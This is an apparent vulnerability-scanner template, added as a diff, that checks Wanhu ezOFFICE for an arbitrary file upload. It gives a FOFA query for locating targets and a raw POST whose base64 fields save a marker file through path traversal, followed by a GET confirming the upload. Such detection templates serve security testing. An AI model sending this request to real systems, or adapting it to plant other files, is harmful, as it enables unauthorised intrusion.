@@ -1,0 +1,56 @@
+#需要运行1~3回，上传文件时太慢，可能还没有上传完成，就已经做出了判断,而且慢的一匹，推荐使用那个poc
+id: wanhuwangluo-upload
+info:
+  name: wanhuwangluo-upload
+  author: rhbb
+  severity: critical
+  description: 万户网络文件上传
+  reference: https://forum.butian.net/share/359
+  tags: upload
+  fofa: app="万户网络-ezOFFICE"
+
+requests:
+  - raw:
+    - |
+        POST /defaultroot/officeserverservlet HTTP/1.1
+        Host: {{hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5
+        Cookie: OASESSIONID=3F80928E64047FFFAA4665B41C4DBC77; LocLan=zh_CN
+        Connection: close
+        Content-Length: 257
+
+        DBSTEP V3.0     185             0               611             DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        RECORDID=
+        firstFilesize=dHJ1ZQ==
+        isDoc=dHJ1ZQ==
+        moduleType=aW5mb3JtYXRpb24=
+        FILETYPE=Ly4uLy4uL3B1YmxpYy9lZGl0L3Rlc3Q1LnR4dA==
+        isViewOld=MQ==
+        test1234
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/public/edit/test5.txt"
+
+    matchers-condition: and
+    matchers:
+      # 类型(包括word，status，regex等)
+      - type: word
+        part: body
+        words:
+          - "test1234"
+  
+      - type: status
+        status:
+          - 200
